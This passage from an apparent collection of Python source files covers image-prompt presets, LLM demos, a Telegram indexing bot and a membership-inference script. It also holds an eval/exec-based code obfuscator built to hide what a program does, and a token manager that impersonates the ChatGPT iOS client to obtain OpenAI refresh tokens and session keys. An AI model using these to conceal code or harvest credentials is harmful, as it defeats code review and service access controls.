ng_deepnegative_v1_75t, bad quality\",\n        \"refer\": \"\",\n    },\n    \"V4\": {\n        \"base_model\": \"\",\n        \"prompt\": \"badhandv4,ng_deepnegative_v1_75t,EasyNegativeV2,bad_prompt_version2-neg,bad quality\",\n        \"refer\": \"\",\n    },\n    \"V5\": {\n        \"base_model\": \"\",\n        \"prompt\": \"(((multiple heads))), (((bad body))), (((two people))), ((extra arms)), ((deformed body)), (((sexy))), paintings,(((two heads))), ((big head)),sketches, (worst quality:2), (low quality:2), (normal quality:2), lowres, ((monochrome)), ((grayscale)), skin spots, acnes, skin blemishes, age spot, glans, (((nsfw))), nipples, extra fingers, (extra legs), (long neck), mutated hands, (fused fingers), (too many fingers)\",\n        \"refer\": \"Weiban\",\n    },\n}\n",
    "from typing import List\nfrom fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse\nfrom pydantic import BaseModel\n\n\nimport instructor\nimport openai\n\napp = FastAPI()\nclient = instructor.from_openai(openai.OpenAI(), model=\"gpt-4-turbo-preview\")\n\n\nclass Property(BaseModel):\n    name: str\n    value: str\n\n\nclass User(BaseModel):\n    name: str\n    age: int\n    properties: List[Property]\n\n\n@app.post(\"/v1/extract_user\", response_model=User)\ndef extract_user(text: str):\n    user = client.chat.completions.create(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n    return user\n\n\n@app.post(\"/v1/extract_user_stream\")\ndef extract_user_stream(text: str):\n    user_stream = client.chat.completions.create_partial(\n        messages=[\n            {\"role\": \"user\", \"content\": f\"Extract user from `{text}`\"},\n        ],\n        response_model=User,\n    )\n\n    def stream():\n        for partial_user in user_stream:\n            yield f\"data: {partial_user.model_dump_json()}\\n\\n\"\n\n    return StreamingResponse(stream(), media_type=\"text/event-stream\")\n",
    "import base64\nimport hashlib\nimport json\nimport os\nimport time\n\nimport click\nimport requests\nfrom DrissionPage import WebPage, ChromiumOptions\n\n\ndef to_time(t: int = None):\n    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(t))\n\n\ndef to_timestamp(t: str = None):\n    return time.strptime(t, '%Y-%m-%d %H:%M:%S') if t else time.time()\n\n\nclass TokenManager:\n    def __init__(\n            self,\n            refresh_token=None,\n            refresh_interval=60,\n            storage_path='./token.json',\n            proxy='http://127.0.0.1:1082',\n    ):\n        self.refresh_token = refresh_token\n        self.refresh_interval = refresh_interval\n        self.access_token = None\n        self.storage_path = storage_path\n        self.co = ChromiumOptions()\n        if proxy:\n            self.co.set_proxy(proxy)\n            self.proxy = {'all': proxy}\n        else:\n            self.proxy = None\n        self.load_token()\n\n    def get_refresh_token(self):\n        self.ensure_refresh_token()\n        return self.refresh_token\n\n    def get_access_token(self):\n        if self.is_expired():\n            self.refresh()\n        return self.access_token\n\n    def get_sess_key(self):\n        response = requests.post(\n            'https://api.openai.com/dashboard/onboarding/login',\n            headers={\n                \"Authorization\": f\"Bearer {self.get_access_token()}\",\n                \"Content-Type\": \"application/json\",\n                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0\",\n            },\n            proxies=self.proxy\n        )\n        if response.ok:\n            data = json.loads(response.text)\n            return {\n                'sess_key': data['user']['session']['sensitive_id'],\n                'created': to_time(data['user']['session']['created']),\n                'last_use': to_time(data['user']['session']['last_use']),\n            }\n\n    def is_expired(self):\n        if not self.access_token:\n            return True\n        payload = self.access_token.split('.')[1]\n        payload = payload + '=' * - (len(payload) % - 4)\n        exp = json.loads(base64.b64decode(payload).decode()).get('exp')\n        return exp - time.time() < 60\n\n    def refresh(self):\n        self.ensure_refresh_token()\n        if self.is_expired():\n            self.access_token = self.generate_access_token()\n        self.save_token()\n\n    def ensure_refresh_token(self):\n        if self.refresh_token:\n            return\n        code_verifier = self.generate_code_verifier()\n        code_challenge = self.generate_code_challenge(code_verifier)\n        preauth_cookie = self.get_preauth_cookie()\n        url = f'https://auth0.openai.com/authorize' \\\n              f'?client_id=pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh' \\\n              f'&audience=https%3A%2F%2Fapi.openai.com%2Fv1' \\\n              f'&redirect_uri=com.openai.chat%3A%2F%2Fauth0.openai.com%2Fios%2Fcom.openai.chat%2Fcallback' \\\n              f'&scope=openid%20email%20profile%20offline_access%20model.request%20model.read%20organization.read%20offline' \\\n              f'&response_type=code' \\\n              f'&code_challenge={code_challenge}' \\\n              f'&code_challenge_method=S256' \\\n              f'&preauth_cookie={preauth_cookie}'\n\n        url += '&prompt=login'\n        # print(url)\n        # code = input('code: ')\n        page = WebPage(chromium_options=self.co)\n        page.get(url)\n        page.listen.start('com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback')\n        res = page.listen.wait()\n        code = res.url.split('code=')[1]\n        page.close()\n        resp_json = requests.post('https://auth0.openai.com/oauth/token', json={\n            'redirect_uri': 'com.openai.chat://auth0.openai.com/ios/com.openai.chat/callback',\n            'grant_type': 'authorization_code',\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'code': code,\n            'code_verifier': code_verifier\n        }, proxies=self.proxy).json()\n        # print(json.dumps(resp_json, indent=2))\n        self.refresh_token = resp_json.get('refresh_token')\n        self.access_token = resp_json.get('access_token')\n        # self.id_token = resp_json.get('id_token')\n\n    def revoke_refresh_token(self, refresh_token):\n        resp = requests.post('https://auth0.openai.com/oauth/revoke', json={\n            'client_id': 'pdlLIX2Y72MIl2rhLhTE9VV9bN905kBh',\n            'token': refresh_token\n        }, proxies=self.proxy)\n        assert resp.status_code == 200\n\n    @staticmethod\n    def generate_code_verifier():\n        return base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip('=')\n\n    @staticmethod\n    def generate_code_challenge(code_verifier):\n        m = hashlib.sha256()\n        m.update(code_verifier.encode())\n        return base64.urlsafe_b64encode(m.digest()).decode().rstrip('=')\n\n    @staticmethod\n    def get_preauth_cookie():\n        # fakeopen\u5df2\u6302\n        # return requests.get('https:",
    "import os\nimport re\nimport json\nimport hashlib\nimport shutil\nimport traceback\nimport requests\nfrom io import BytesIO\nfrom dataclasses import dataclass\nfrom typing import Optional, List, Any, Union\n\n\ndef ensure_directory_exists(path: str):\n    if not os.path.exists(path):\n        os.mkdir(path)\n\n\ndef download_file(url: str, filename: str):\n    \"\"\"Download `url` and save the contents to `filename`.  Skip if `filename` already exists.\"\"\"\n    if not os.path.exists(filename):\n        print(f\"Downloading {url} to {filename}\")\n        response = requests.get(url)\n        with open(filename, \"wb\") as f:\n            shutil.copyfileobj(BytesIO(response.content), f)\n\n\ndef cached(url: str) -> str:\n    \"\"\"Download `url` if needed and return the location of the cached file.\"\"\"\n    name = re.sub(r\"[^\\w_-]+\", \"_\", url)\n    url_hash = hashlib.md5(url.encode('utf-8')).hexdigest()\n\n    path = os.path.join(\"var\", url_hash + \"-\" + name)\n    download_file(url, path)\n    return path\n\n\ndef get_stack():\n    \"\"\"Return the current stack as a string.\"\"\"\n    stack = traceback.extract_stack()\n    stack = [frame.name for frame in stack]  # Take only names\n    i = None\n    for j, name in enumerate(stack):\n        if name == \"<module>\":\n            i = j\n    stack = stack[i + 1:]  # Delete everything up to the last module\n    stack = stack[:-2]  # Remove the current two functions (get_stack and point/figure/etc.)\n    return stack\n\ndef note(message: str):\n    \"\"\"Make a note (bullet point) with `message`.\"\"\"\n    print(\"note:\", message)\n    stack = json.dumps(get_stack())\n    arg = json.dumps(message)\n    add_content([f\"addText({stack}, {arg});\"])\n\n\ndef see(obj: Any):\n    \"\"\"References `obj` in the code, but don't print anything out.\"\"\"\n    print(\"see:\", obj)\n\n\ndef image(path: str):\n    \"\"\"Show the image at `path`.\"\"\"\n    print(\"image:\", path)\n    stack = json.dumps(get_stack())\n    arg = json.dumps(path)\n    add_content([f\"addImage({stack}, {arg});\"])\n\n\nhas_added_content = False\n\ndef add_content(lines: List[str]):\n    \"\"\"\n    Add content that would be displayed by `view.html`.\n    The first time we call this function, we clear the content.\n    `lines`: list of Javascript lines.\n    \"\"\"\n    global has_added_content\n    mode = \"w\" if not has_added_content else \"a\"\n    has_added_content = True\n    with open(\"content.js\", mode) as f:\n        for line in lines:\n            print(line, file=f)\n\n############################################################\n\n@dataclass(frozen=True)\nclass Spec:\n    name: Optional[str] = None\n    author: Optional[str] = None\n    organization: Optional[str] = None\n    date: Optional[str] = None\n    url: Optional[str] = None\n    description: Optional[Union[str, List[str]]] = None\n    references: Optional[List[Any]] = None\n\n\n@dataclass(frozen=True)\nclass MethodSpec(Spec):\n    pass\n\n\n@dataclass(frozen=True)\nclass DataSpec(Spec):\n    num_tokens: Optional[int] = None\n    vocabulary_size: Optional[int] = None\n\n\n@dataclass(frozen=True)\nclass ArchitectureSpec(Spec):\n    num_parameters: Optional[int] = None\n    num_layers: Optional[int] = None\n    dim_model: Optional[int] = None\n    num_heads: Optional[int] = None\n    dim_head: Optional[int] = None\n    description: Optional[str] = None\n    references: Optional[List[Any]] = None\n\n\n@dataclass(frozen=True)\nclass TrainingSpec(Spec):\n    context_length: Optional[int] = None\n    batch_size_tokens: Optional[int] = None\n    learning_rate: Optional[float] = None\n    weight_decay: Optional[float] = None\n    optimizer: Optional[str] = None\n    hardware: Optional[str] = None\n    num_epochs: Optional[int] = None\n    num_flops: Optional[int] = None\n    references: Optional[List[Any]] = None\n\n\n@dataclass(frozen=True)\nclass ModelSpec(Spec):\n    data: Optional[DataSpec] = None\n    architecture: Optional[ArchitectureSpec] = None\n    training: Optional[TrainingSpec] = None\n",
    "import argparse\nimport torch\n\nimport gradio as gr\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\n\n\ntokenizer, model = None, None\n\n\ndef init_model(args):\n    global tokenizer, model\n    tokenizer = AutoTokenizer.from_pretrained(args.tokenizer_path, truncation_side=\"left\", padding_side=\"left\")\n    model = AutoModelForCausalLM.from_pretrained(args.model_path, trust_remote_code=True, torch_dtype=torch.bfloat16, device_map='auto')\n    model = model.eval()\n\n\ndef batch_call(texts, skip_special_tokens=True, **kwargs):\n    tokenized = tokenizer(texts, padding=True, return_tensors=\"pt\")\n    inputs = {key: value.cuda() for key, value in tokenized.items() if key != 'token_type_ids'}\n    generate_ids = model.generate(**inputs, **kwargs)\n\n    output =[]\n    for tok, gen in zip(tokenized.input_ids, generate_ids):\n        generated = tokenizer.decode(gen[len(tok):], skip_special_tokens=skip_special_tokens)\n        output.append(generated)\n    return output\n\n\ndef text_generation(texts, max_new_tokens, temperature, top_k, top_p):\n    output = batch_call(texts, max_new_tokens=max_new_tokens, do_sample=True, top_k=top_k, top_p=top_p, temperature=temperature, eos_token_id=tokenizer.eos_token_id)\n    return output[0]\n\n\ndef get_args():\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--port\", type=int, default=20014,\n                        help=\"server port\")\n    parser.add_argument(\"--model_path\", type=str, default=\"./model\",\n                        help=\"Path to the model. Specifies the file path to the pre-trained model to be used for text generation.\")\n    parser.add_argument(\"--tokenizer_path\", type=str, default=\"./model\",\n                        help=\"Path to the tokenizer.\")\n    args = parser.parse_args()\n    return args\n\n\nif __name__ == \"__main__\":\n    args = get_args()\n\n    # initialize model and tokenizer\n    init_model(args)\n\n    with gr.Blocks() as demo:\n        gr.Markdown(\n            \"# <center>{}</center>\".format(\"XVERSE-MoE-25B Text Generation\"))\n        with gr.Row():\n            with gr.Column():\n                inputs = gr.inputs.Textbox(\n                    lines=5, label=\"Input Text\")  # input\n                with gr.Column():\n                    max_new_tokens = gr.Slider(maximum=512, value=100, minimum=1, step=1,\n                                               label=\"max_new_tokens\", interactive=True)  # max_new_tokens\n                    temperature = gr.Slider(maximum=1.0, value=1.0, minimum=0.0, step=0.05,\n                                            label='temperature', interactive=True)  # temperature\n                    top_k = gr.Slider(maximum=50, value=50, minimum=0, step=1,\n                                      label='Top K', interactive=True)  # top_k\n                    top_p = gr.Slider(maximum=1, value=0.92, minimum=0,\n                                      step=0.02, label='Top P', interactive=True)  # top_p\n\n            with gr.Row():\n                outputs = gr.inputs.Textbox(lines=2, label=\"Output Text\")\n\n        with gr.Row():\n            submit_btn = gr.Button(value=\"\u751f\u6210\", variant=\"secondary\")\n            reset_btn = gr.ClearButton(components=[inputs, outputs], value=\"\u6e05\u9664\", variant=\"secondary\")\n\n        submit_btn.click(fn=text_generation,\n                         inputs=[inputs, max_new_tokens,\n                                 temperature, top_k, top_p],\n                         outputs=outputs)\n\n    demo.launch(server_name=\"0.0.0.0\", server_port=args.port)\n",
    "import logging\nimport asyncio\nfrom pyrogram import Client, filters, enums\nfrom pyrogram.errors import FloodWait\nfrom pyrogram.errors.exceptions.bad_request_400 import ChannelInvalid, ChatAdminRequired, UsernameInvalid, UsernameNotModified\nfrom info import ADMINS\nfrom info import INDEX_REQ_CHANNEL as LOG_CHANNEL\nfrom database.ia_filterdb import save_file\nfrom pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton\nfrom utils import temp\nimport re\nlogger = logging.getLogger(__name__)\nlogger.setLevel(logging.INFO)\nlock = asyncio.Lock()\n\n\n@Client.on_callback_query(filters.regex(r'^index'))\nasync def index_files(bot, query):\n    if query.data.startswith('index_cancel'):\n        temp.CANCEL = True\n        return await query.answer(\"Cancelling Indexing\")\n    _, raju, chat, lst_msg_id, from_user = query.data.split(\"#\")\n    if raju == 'reject':\n        await query.message.delete()\n        await bot.send_message(int(from_user),\n                               f'Your Submission for indexing {chat} has been decliened by our moderators.',\n                               reply_to_message_id=int(lst_msg_id))\n        return\n\n    if lock.locked():\n        return await query.answer('Wait until previous process complete.', show_alert=True)\n    msg = query.message\n\n    await query.answer('Processing...\u23f3', show_alert=True)\n    if int(from_user) not in ADMINS:\n        await bot.send_message(int(from_user),\n                               f'Your Submission for indexing {chat} has been accepted by our moderators and will be added soon.',\n                               reply_to_message_id=int(lst_msg_id))\n    await msg.edit(\n        \"Starting Indexing\",\n        reply_markup=InlineKeyboardMarkup(\n            [[InlineKeyboardButton('Cancel', callback_data='index_cancel')]]\n        )\n    )\n    try:\n        chat = int(chat)\n    except:\n        chat = chat\n    await index_files_to_db(int(lst_msg_id), chat, msg, bot)\n\n\n@Client.on_message((filters.forwarded | (filters.regex(\"(https://)?(t\\.me/|telegram\\.me/|telegram\\.dog/)(c/)?(\\d+|[a-zA-Z_0-9]+)/(\\d+)$\")) & filters.text ) & filters.private & filters.incoming)\nasync def send_for_index(bot, message):\n    if message.text:\n        regex = re.compile(\"(https://)?(t\\.me/|telegram\\.me/|telegram\\.dog/)(c/)?(\\d+|[a-zA-Z_0-9]+)/(\\d+)$\")\n        match = regex.match(message.text)\n        if not match:\n            return await message.reply('Invalid link')\n        chat_id = match.group(4)\n        last_msg_id = int(match.group(5))\n        if chat_id.isnumeric():\n            chat_id  = int((\"-100\" + chat_id))\n    elif message.forward_from_chat.type == enums.ChatType.CHANNEL:\n        last_msg_id = message.forward_from_message_id\n        chat_id = message.forward_from_chat.username or message.forward_from_chat.id\n    else:\n        return\n    try:\n        await bot.get_chat(chat_id)\n    except ChannelInvalid:\n        return await message.reply('This may be a private channel / group. Make me an admin over there to index the files.')\n    except (UsernameInvalid, UsernameNotModified):\n        return await message.reply('Invalid Link specified.')\n    except Exception as e:\n        logger.exception(e)\n        return await message.reply(f'Errors - {e}')\n    try:\n        k = await bot.get_messages(chat_id, last_msg_id)\n    except:\n        return await message.reply('Make Sure That Iam An Admin In The Channel, if channel is private')\n    if k.empty:\n        return await message.reply('This may be group and iam not a admin of the group.')\n\n    if message.from_user.id in ADMINS:\n        buttons = [\n            [\n                InlineKeyboardButton('Yes',\n                                     callback_data=f'index#accept#{chat_id}#{last_msg_id}#{message.from_user.id}')\n            ],\n            [\n                InlineKeyboardButton('close', callback_data='close_data'),\n            ]\n        ]\n        reply_markup = InlineKeyboardMarkup(buttons)\n        return await message.reply(\n            f'Do you Want To Index This Channel/ Group ?\\n\\nChat ID/ Username: <code>{chat_id}</code>\\nLast Message ID: <code>{last_msg_id}</code>',\n            reply_markup=reply_markup)\n\n    if type(chat_id) is int:\n        try:\n            link = (await bot.create_chat_invite_link(chat_id)).invite_link\n        except ChatAdminRequired:\n            return await message.reply('Make sure iam an admin in the chat and have permission to invite users.')\n    else:\n        link = f\"@{message.forward_from_chat.username}\"\n    buttons = [\n        [\n            InlineKeyboardButton('Accept Index',\n                                 callback_data=f'index#accept#{chat_id}#{last_msg_id}#{message.from_user.id}')\n        ],\n        [\n            InlineKeyboardButton('Reject Index',\n                                 callback_data=f'index#reject#{chat_id}#{message.id}#{message.from_user.id}'),\n        ]\n    ]\n    reply_markup = InlineKeyboardMarkup(buttons)\n    await bot.send_message(LOG_CHANNEL,\n                           f'#IndexRequest\\n\\nBy : {mes",
    "import json\nimport os\n\nfrom api2d import Main\nfrom load_config import get_yaml_config, check_file_exists, print_tip\nimport aiofiles\nconfig = get_yaml_config()\nmemory = config[\"book\"][\"memory\"]\n\n\ndef write_to_json(data, filename):\n    try:\n        with open(filename, \"rb+\") as file:\n            file.seek(0, 2)  # \u79fb\u5230\u6587\u4ef6\u672b\u5c3e\n            if file.tell():  # \u5982\u679c\u6587\u4ef6\u975e\u7a7a\n                file.seek(-1, 2)  # \u5b9a\u4f4d\u5230\u6587\u4ef6\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff08\u5373\u7ed3\u5c3e\u7684 ']' \u524d\uff09\n                file.truncate()  # \u5220\u9664\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff08']'\uff09\n                if file.tell() > 1:\n                    file.write(b\",\\n\")  # \u5982\u679c\u4e0d\u662f\u6587\u4ef6\u5f00\u5934\uff0c\u5199\u5165\u9017\u53f7\u548c\u6362\u884c\u7b26\n                else:\n                    file.write(b\"\\n\")  # \u5426\u5219\u53ea\u5199\u5165\u6362\u884c\u7b26\n                file.write(json.dumps(data).encode())  # \u5199\u5165\u65b0\u7684 JSON \u5bf9\u8c61\n                file.write(b\"\\n]\")  # \u91cd\u65b0\u6dfb\u52a0\u7ed3\u5c3e\u7684 ']'\n            else:  # \u5982\u679c\u6587\u4ef6\u4e3a\u7a7a\n                file.write(\n                    json.dumps([data], indent=4).encode()\n                )  # \u521b\u5efa\u65b0\u6587\u4ef6\u5e76\u5199\u5165\u6570\u7ec4\n    except FileNotFoundError:\n        with open(filename, \"wb\") as file:  # \u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u521b\u5efa\u5e76\u5199\u5165\n            file.write(json.dumps([data], indent=4).encode())\n\n\ndef extract_str(text):\n    try:\n        xx = text[\"content\"]\n    except:\n        raise Exception(text)\n    xxx = xx.split(\"**Negative Prompt:**\", 1)\n\n    prompt = (\n        xxx[0]\n        .replace(\"**Negative Prompt:**\", \"\")\n        .replace(\"**Prompt:**\", \"\")\n        .replace(\"Prompt:\", \"\")\n        .replace(\"\\n\", \"\")\n    )\n    negative_prompt = (\n        xxx[1]\n        .replace(\"**Negative Prompt:**\", \"\")\n        .replace(\"Prompt:\", \"\")\n        .replace(\"**Prompt:**\", \"\")\n        .replace(\"\\n\", \"\")\n    )\n\n    return prompt, negative_prompt\n\n\nasync def process_line(line, line_number, prompt_json_save_path, messages_save_path, name):\n    await print_tip(f\"\u6b63\u5728\u5904\u7406\u7b2c{line_number}\u6bb5\")\n    is_exists = await check_file_exists(prompt_json_save_path)\n    is_message_exists = await check_file_exists(messages_save_path)\n    if memory and is_exists:\n        with open(prompt_json_save_path, \"r\", encoding=\"utf-8\") as file:\n            prompt_data = json.load(file)\n        if line_number <= len(prompt_data):\n            await print_tip(f\"\u4f7f\u7528\u7f13\u5b58\uff1a\u8df3\u8fc7\u7b2c{line_number}\u6bb5\")\n            return \n        else:\n            if is_message_exists:\n                async with aiofiles.open(\n                    messages_save_path, \"r\", encoding=\"utf-8\"\n                ) as f:\n                    content = await f.read()\n                    messages = json.loads(content)\n    text = f\"\u7b2c{line_number}\u6bb5\uff1a\" + line.strip()\n    if not is_message_exists:\n        with open(f\"{name}prompt.txt\", \"r\", encoding=\"utf8\") as f:\n            messages = [\n                {\n                    \"role\": \"system\",\n                    \"content\": f.read(),\n                }\n            ]\n\n    result, message, total_tokens = await Main().prompt_generation_chatgpt(text, messages)\n    await print_tip(f\"\u5f53\u524dtotal_tokens:{total_tokens}\")\n    if total_tokens >= 16385:\n        # token \u5df2\u7ecf\u8fbe\u5230\u4e0a\u9650 \u91cd\u65b0\u8bf7\u6c42GPT \u6e05\u7a7a\u4e4b\u524d\u7684\u8bb0\u5f55\n        os.remove(messages_save_path)\n        return await process_line(line, line_number, prompt_json_save_path, messages_save_path, name)\n    else:\n        prompt, negative_prompt = extract_str(message)\n        write_to_json(\n            {\"prompt\": prompt, \"negative_prompt\": negative_prompt},\n            prompt_json_save_path,\n        )\n        messages = result + [message]\n        with open(messages_save_path, \"w\") as f:\n            f.write(json.dumps(messages))\n        return \n\n\nasync def generate_prompt(path, save_path, name):\n    await print_tip(\"\u5f00\u59cb\u751f\u6210\u63d0\u793a\u8bcd\")\n    async with aiofiles.open(f\"{path}/{name}.txt\", \"r\", encoding=\"utf8\") as file:\n        # \u521d\u59cb\u5316\u884c\u6570\u8ba1\u6570\u5668\n        lines = await file.readlines()\n        # \u5faa\u73af\u8f93\u51fa\u6bcf\u4e00\u884c\u5185\u5bb9\n        prompt_json_save_path = os.path.join(save_path, f\"{name}.json\")\n        messages_save_path = os.path.join(save_path, f\"{name}messages.json\")\n        for line_number, line in enumerate(lines, start=1):\n            if line:\n                await process_line(line, line_number, prompt_json_save_path, messages_save_path, name)\n\n\n    # async with aiofiles.open(f\"{path}/{name}.txt\", \"r\", encoding=\"utf8\") as file:\n    #     # \u521d\u59cb\u5316\u884c\u6570\u8ba1\u6570\u5668\n    #     line_number = 0\n    #     lines = await file.readlines()\n    #     messages = []\n    #     # \u5faa\u73af\u8f93\u51fa\u6bcf\u4e00\u884c\u5185\u5bb9\n    #     prompt_json_save_path = os.path.join(save_path, f\"{name}.json\")\n    #     for line in lines:\n    #         if line:\n    #             line_number += 1\n    #             await print_tip(f\"\u6b63\u5728\u5904\u7406\u7b2c{line_number}\u6bb5\")\n    #             is_exists = await check_file_exists(prompt_json_save_path)\n    #             if memory and is_exists:\n    #                 with open(prompt_json_save_path, \"r\", encoding=\"utf-8\") as file:\n    #                     prompt_data = json.load(file)\n    #                 if line_number <= len(prompt_data):\n    #                     await print_tip(f\"\u4f7f\u7528\u7f13\u5b58\uff1a\u8df3\u8fc7\u7b2c{line_number}\u6bb5\")\n    #                     continue\n    #                 else:\n    #                     async with aiofiles.open(\n    #                         f\"{save_path}/{name}messages.json\", \"r\", enc",
    "import os\r\nimport base64 \r\nimport argparse\r\nimport codecs\r\nimport random\r\nimport string\r\nfrom colorama import Fore\r\n\r\n\r\nclass Obfuscator:\r\n    def __init__(self, code):\r\n        self.code = code\r\n        self.__obfuscate()\r\n    \r\n    def __xorED(self, text, key = None):\r\n        newstring = \"\"\r\n        if key is None:\r\n            key = \"\".join(random.choices(string.digits + string.ascii_letters, k= random.randint(4, 8)))\r\n        if not key[0] == \" \":\r\n            key = \" \" + key\r\n        for i in range(len(text)):\r\n            newstring += chr(ord(text[i]) ^ ord(key[(len(key) - 2) + 1]))\r\n        return (newstring, key)\r\n\r\n    def __encodestring(self, string):\r\n        newstring = ''\r\n        for i in string:\r\n            if random.choice([True, False]):\r\n                newstring += '\\\\x' + codecs.encode(i.encode(), 'hex').decode()\r\n            else:\r\n                newstring += '\\\\' + oct(ord(i))[2:]\r\n        return newstring\r\n\r\n    def __obfuscate(self):\r\n        xorcod = self.__xorED(self.code)\r\n        self.code = xorcod[0]\r\n        encoded_code = base64.b64encode(codecs.encode(codecs.encode(self.code.encode(), 'bz2'), 'uu')).decode()\r\n        encoded_code = [encoded_code[i:i + int(len(encoded_code) / 4)] for i in range(0, len(encoded_code), int(len(encoded_code) / 4))]\r\n        new_encoded_code = []\r\n        new_encoded_code.append(codecs.encode(encoded_code[0].encode(), 'uu').decode() + 'u')\r\n        new_encoded_code.append(codecs.encode(encoded_code[1], 'rot13') + 'r')\r\n        new_encoded_code.append(codecs.encode(encoded_code[2].encode(), 'hex').decode() + 'h')\r\n        new_encoded_code.append(base64.b85encode(codecs.encode(encoded_code[3].encode(), 'hex')).decode() + 'x')\r\n        self.code = f\"\"\"\r\n_0x711=eval(\"{self.__encodestring('eval')}\");_0x711__=_0x711(\"{self.__encodestring('compile')}\");_0x711_,____=_0x711(_0x711__(\"{self.__encodestring(\"__import__('base64')\")}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring(\"__import__('codecs')\")}\",\"\",_0x711.__name__));_0x711_0x711_0x711_0x711=_0x711(\"'{self.__encodestring(xorcod[True])}'\");_0x711___,_0x711____,_0x711_0x711,_0x711_0x711_=_0x711(_0x711__(\"{self.__encodestring('exec')}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring('str.encode')}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring('isinstance')}\",\"\",_0x711.__name__)),_0x711(_0x711__(\"{self.__encodestring('bytes')}\",\"\",_0x711.__name__))\r\ndef _0x711_0x711_0x711____(_0x711_0x711, _0x711_0x711_):\r\n    _0x711_0x711=_0x711_0x711.decode()\r\n    _0x711____=\"\"\r\n    if not _0x711_0x711_[False]==\"{self.__encodestring(' ')}\":\r\n        _0x711_0x711_=\"{self.__encodestring(' ')}\"+_0x711_0x711_\r\n    for _ in range(_0x711(\"{self.__encodestring('len(_0x711_0x711)')}\")):\r\n        _0x711____+=_0x711(\"{self.__encodestring('chr(ord(_0x711_0x711[_])^ord(_0x711_0x711_[(len(_0x711_0x711_) - True*2) + True]))')}\")\r\n    return (_0x711____,_0x711_0x711_)\r\ndef _0x711_0x711__(_0x711_0x711___):\r\n    if(_0x711_0x711___[-True]!=_0x711(_0x711__(\"'{self.__encodestring('c_0x711_0x711_0x711_6s5_0x711_0x711_0x711_6ardv8')}'[-True*4]\",\"\",_0x711.__name__))):_0x711_0x711___ = _0x711____(_0x711_0x711___)\r\n    if not(_0x711_0x711(_0x711_0x711___, _0x711_0x711_)):_0x711_0x711___ = _0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('rot13')}')\",\"\",_0x711.__name__))\r\n    else:\r\n        if(_0x711_0x711___[-True]==_0x711(_0x711__(\"b'{self.__encodestring('f5sfsdfauf85')}'[-True*4]\",\"\", _0x711.__name__))):\r\n            _0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('uu')}')\",\"\",_0x711.__name__))\r\n        elif (_0x711_0x711___[-True] ==_0x711(_0x711__(\"b'{self.__encodestring('d5sfs1dffhsd8')}'[-True*4]\",\"\", _0x711.__name__))):_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___[:-True]')},'{self.__encodestring('hex')}')\",\"\",_0x711.__name__))\r\n        else:_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('_0x711_.b85decode(_0x711_0x711___[:-True])')}\",\"\",_0x711.__name__));_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('____.decode(_0x711_0x711___')}, '{self.__encodestring('hex')}')\",\"\",_0x711.__name__))\r\n        _0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode(_0x711_0x711___)')}\",\"\",_0x711.__name__))\r\n    return _0x711_0x711___\r\n_0x711_0x711_0x711__=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*3]).encode()})\",\"\",_0x711.__name__));_0x711_0x711_0x711_ = _0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[1]).encode()})\",\"\",_0x711.__name__));_0x711_0x711_0x711___=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_code[True*2]).encode()})\",\"\",_0x711.__name__));_0x711_0x711____=_0x711(_0x711__(\"{self.__encodestring('_0x711_0x711_.decode')}({self.__encodestring(new_encoded_co",
    "import os, argparse\nfrom collections import defaultdict\nimport numpy as np\nimport pandas as pd\nfrom sklearn.metrics import roc_curve, auc\nfrom tqdm import tqdm\nimport zlib\n\nimport torch\nimport torch.nn.functional as F\n\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\nfrom datasets import load_dataset\n\n\n# helper function\ndef convert_huggingface_data_to_list_dic(dataset):\n    all_data = []\n    for i in range(len(dataset)):\n        ex = dataset[i]\n        all_data.append(ex)\n    return all_data\n\n# arguments\nparser = argparse.ArgumentParser()\nparser.add_argument('--model', type=str, default='EleutherAI/pythia-2.8b')\nparser.add_argument(\n    '--dataset', type=str, default='WikiMIA_length32', \n    choices=[\n        'WikiMIA_length32', 'WikiMIA_length64', 'WikiMIA_length128', \n        'WikiMIA_length32_paraphrased',\n        'WikiMIA_length64_paraphrased',\n        'WikiMIA_length128_paraphrased', \n    ]\n)\nparser.add_argument('--half', action='store_true')\nparser.add_argument('--int8', action='store_true')\nargs = parser.parse_args()\n\n# load model\ndef load_model(name):\n    int8_kwargs = {}\n    half_kwargs = {}\n    if args.int8:\n        int8_kwargs = dict(load_in_8bit=True, torch_dtype=torch.bfloat16)\n    elif args.half:\n        half_kwargs = dict(torch_dtype=torch.bfloat16)\n    \n    if 'mamba' in name:\n        try:\n            from transformers import MambaForCausalLM\n        except ImportError:\n            raise ImportError\n        model = MambaForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )        \n    